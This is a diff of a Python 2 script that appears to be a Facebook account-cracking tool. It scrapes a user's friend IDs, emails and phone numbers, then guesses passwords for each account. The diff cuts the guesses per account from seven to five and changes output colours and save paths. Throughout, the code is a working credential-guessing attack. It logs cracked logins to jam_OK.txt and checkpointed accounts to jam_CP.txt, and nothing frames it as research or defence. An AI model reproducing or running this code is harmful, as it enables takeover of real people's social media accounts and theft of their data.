@@ -137,7 +137,7 @@ def menu():
 	print (47*"-")
 	print "[1] Start Cloning."
 	print "[2] Clone With Fast Mode."
-	print "[3] Grabbing Tools."
+	print "[3] Extract Tools."
 	print "[4] Auto Del Tools."
 	print "[5] Update jam Tool."
 	print "[6] Follow Me On Facebook."
@@ -216,11 +216,9 @@ def crack_menu():
 		print banner
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                pass3 = raw_input(' \033[1;92m[3]Password: ')
 		pass4 = raw_input(' \033[1;92m[4]Password: ')
                 pass5 = raw_input(' \033[1;92m[5]Password: ')
-                pass6 = raw_input(' \033[1;92m[6]Password: ')
-                pass7 = raw_input(' \033[1;92m[7]Password: ')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -230,11 +228,9 @@ def crack_menu():
 		print banner
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                pass3 = raw_input(' \033[1;92m[3]Password: ')
 		pass4 = raw_input(' \033[1;92m[4]Password: ')
                 pass5 = raw_input(' \033[1;92m[5]Password: ')
-                pass6 = raw_input(' \033[1;92m[6]Password: ')
-                pass7 = raw_input(' \033[1;92m[7]Password: ')
 		idt = raw_input("[+] Input ID: ")
 		
 		try:
@@ -253,12 +249,10 @@ def crack_menu():
 	    os.system('clear')
 	    print banner
 	    p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-            p2 = raw_input('\033[1;92m[2]Name + digit: ')
-            p3 = raw_input('\033[1;92m[3]Name + digit: ')
-            pass4 = raw_input('\033[1;92m[4]Password: ')
-            pass5 = raw_input('\033[1;92m[5]Password: ')
-            pass6 = raw_input('\033[1;92m[6]Password: ')
-            pass7 = raw_input('\033[1;92m[7]Password: ')
+            p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+            pass3 = raw_input(' \033[1;92m[3]Password: ')
+	    pass4 = raw_input(' \033[1;92m[4]Password: ')
+            pass5 = raw_input(' \033[1;92m[5]Password: ')
 	    try:
 	        idlist= raw_input('[+] File Name: ')
 	        for line in open(idlist ,'r').readlines():
@@ -306,7 +300,7 @@ def crack_menu():
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass1
+                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
                         cp = open('jam_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass1 + '\n')
                         cp.close()
@@ -322,13 +316,12 @@ def crack_menu():
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass2
+                            print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
                             cp = open('jam_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass2 + '\n')
                             cp.close()
                             cps.append(uid + pass2)
 			else:
-			    pass3 = name.lower() + p3
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = br.addheader).text
                             q = json.loads(data)
                             if 'loc' in q:
@@ -338,7 +331,7 @@ def crack_menu():
                                 ok.close()
                                 oks.append(uid + pass3)
                             elif 'www.facebook.com' in q['error']:
-                                print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass3
+                                print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass3
                                 cp = open('jam_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass3 + '\n')
                                 cp.close()
@@ -353,7 +346,7 @@ def crack_menu():
                                     ok.close()
                                     oks.append(uid + pass4)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
+                                    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass4
                                     cp = open('jam_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass4 + '\n')
                                     cp.close()
@@ -368,41 +361,11 @@ def crack_menu():
                                         ok.close()
                                         oks.append(uid + pass5)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass5
+                                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass5
                                         cp = open('jam_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass5 + '\n')
                                         cp.close()
                                         cps.append(uid + pass5)
-				    else:
-					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = br.addheader).text
-                                        q = json.loads(data)
-                                        if 'loc' in q:
-                                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass6
-                                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                            ok.write(uid + ' | ' + pass6 + '\n')
-                                            ok.close()
-                                            oks.append(uid + pass6)
-                                        elif 'www.facebook.com' in q['error']:
-                                            print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass6
-                                            cp = open('jam_CP.txt', 'a')
-                                            cp.write(uid + ' | ' + pass6 + '\n')
-                                            cp.close()
-                                            cps.append(uid + pass6)
-					else:
-					    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = br.addheader).text
-                                            q = json.loads(data)
-                                            if 'loc' in q:
-                                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass7
-                                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                                ok.write(uid + ' | ' + pass7 + '\n')
-                                                ok.close()
-                                                oks.append(uid + pass7)
-                                            elif 'www.facebook.com' in q['error']:
-                                                print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass7
-                                                cp = open('jam_CP.txt', 'a')
-                                                cp.write(uid + ' | ' + pass7 + '\n')
-                                                cp.close()
-                                                cps.append(uid + pass7)
 		except:
 			pass
 		
@@ -471,7 +434,7 @@ def idfromfriend():
 		time.sleep(1)
 		('python2 jam.py')
 	try:
-		os.mkdir('save')
+		os.mkdir('/sdcard/jam.txt')
 	except OSError:
 		pass
 	try:
@@ -530,7 +493,7 @@ def emailfromfriend():
 		time.sleep(1)
 		os.system('python2 jam.py')
 	try:
-		os.mkdir('save')
+		os.mkdir('/sdcard/Email.txt')
 	except OSError:
 		pass
 	try:
@@ -597,7 +560,7 @@ def numberfromfriend():
 		time.sleep(1)
 		os.system('python2 jam.py')
 	try:
-		os.mkdir('save')
+		os.mkdir('/sdcard/Number.txt')
 	except OSError:
 		pass
 	try:
